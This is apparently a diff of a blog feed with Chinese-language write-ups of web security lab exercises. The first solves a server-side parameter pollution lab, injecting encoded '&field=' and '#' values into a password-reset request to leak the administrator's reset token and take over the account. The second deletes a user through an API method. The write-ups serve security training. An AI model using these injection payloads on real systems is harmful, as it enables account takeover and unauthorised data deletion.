+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>在上述Request送出时，会获得&lt;code>javascript&lt;/code>，当中包含代码片段，说明若url中包含&lt;code>reset-token&lt;/code>参数则跳转到&lt;code>/forgot-password?reset_token=${resetToken}&lt;/code>，否则为当前场景下看到的页面
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">forgotPwdReady&lt;/span>(() =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">queryString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">search&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">urlParams&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">URLSearchParams&lt;/span>(&lt;span style="color:#a6e22e">queryString&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">resetToken&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urlParams&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;reset-token&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">resetToken&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">`/forgot-password?reset_token=&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">resetToken&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">forgotPasswordBtn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">getElementById&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;forgot-password-btn&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">forgotPasswordBtn&lt;/span>.&lt;span style="color:#a6e22e">addEventListener&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;click&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">displayMsg&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>下述开始通过猜测&lt;code>POST /forgot-password&lt;/code>的Request body来获得&lt;code>reset_token&lt;/code>
+&lt;ol>
+&lt;li>修改Request body，将&lt;code>username&lt;/code>修改为随机用户&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=user
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">&amp;#34;ClientError&amp;#34;,&amp;#34;code&amp;#34;:400,&amp;#34;error&amp;#34;:&amp;#34;Invalid username.&amp;#34;}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;li>尝试使用URL编码(&lt;code>#&lt;/code>)截断服务器端查询字符串&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;error&amp;#34;: &amp;#34;Field not specified.&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>猜测服务器端包含&lt;code>field&lt;/code>参数，在Request body尾端新增&lt;code>&amp;amp;field=x#&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%26field=x%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;ClientError&amp;#34;,&amp;#34;code&amp;#34;:400,&amp;#34;error&amp;#34;:&amp;#34;Invalid field.&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>通过Burp Intruder进行参数值猜测，&lt;code>Payload&lt;/code>选择&lt;code>Simple list&lt;/code>、&lt;code>Payload configuration&lt;/code>选择&lt;code>Server-side variable names&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%26field=§x§%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;li>使用&lt;code>Intruder attack results filter&lt;/code>进行结果过滤，获得可能的参数值
+&lt;img alt="Intruder attack results filter" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-3.jpg">
+&lt;img alt="Intruder attack results" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-4.jpg">&lt;/li>
+&lt;li>使用&lt;code>email&lt;/code>带入参数值&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%26field=email%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;email&amp;#34;,&amp;#34;result&amp;#34;:&amp;#34;*****@normal-user.net&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="7">
+&lt;li>使用javascript所需要的&lt;code>reset_token&lt;/code>带入参数值&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=8eI4BNOqz3he4H8F5LbSTDl5pmOfu9wT&amp;amp;username=administrator%26field=reset_token%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;reset_token&amp;#34;,&amp;#34;result&amp;#34;:&amp;#34;zinhaiat2t4zg3zgx7svz951qokdb33b&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到页面使用&lt;code>/forgot-password?reset_token=zinhaiat2t4zg3zgx7svz951qokdb33b&lt;/code>进行访问
+&lt;img alt="Reset password" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-5.jpg">&lt;/li>
+&lt;li>使用更新后的密码登录&lt;code>administrator&lt;/code>，登录成功后点击右上方的&lt;code>Admin panel&lt;/code>
+&lt;img alt="Admin panel" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-6.jpg">&lt;/li>
+&lt;li>点击&lt;code>carlos - Delete&lt;/code>后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Exploiting an API endpoint using documentation</title><link>/posts/2024/api-testing-lab-exploiting-api-endpoint-using-documentation/</link><pubDate>Sat, 14 Dec 2024 22:32:19 +0800</pubDate><guid>/posts/2024/api-testing-lab-exploiting-api-endpoint-using-documentation/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-api-endpoint-using-documentation-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-api-endpoint-using-documentation-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>修改&lt;code>Email&lt;/code>
+&lt;img alt="Update email" src="/img/2024/api-testing-lab-exploiting-api-endpoint-using-documentation-2.jpg">&lt;/li>
+&lt;li>对应Request、Response
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PATCH&lt;/span> /api/user/wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;email@email.com&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;username&amp;#34;:&amp;#34;wiener&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;email@email.com&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>使用&lt;code>OPTION&lt;/code>查看可用的&lt;code>HTTP Methods&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">OPTION /api/user/wiener HTTP/2
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">405&lt;/span> &lt;span style="color:#a6e22e">Method Not Allowed&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Allow&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">GET, PATCH, DELETE&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Method Not Allowed&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>使用&lt;code>DELETE&lt;/code>进行对象删除
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">DELETE&lt;/span> /api/user/carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;status&amp;#34;:&amp;#34;User deleted&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>刷新页面后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Referer-based access control</title><link>/posts/2024/access-control-lab-referer-based-access-control/</link><pubDate>Mon, 09 Dec 2024 22:32:44 +0800</pubDate><guid>/posts/2024/access-control-lab-referer-based-access-control/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-referer-based-access-control-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-referer-based-access-control-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
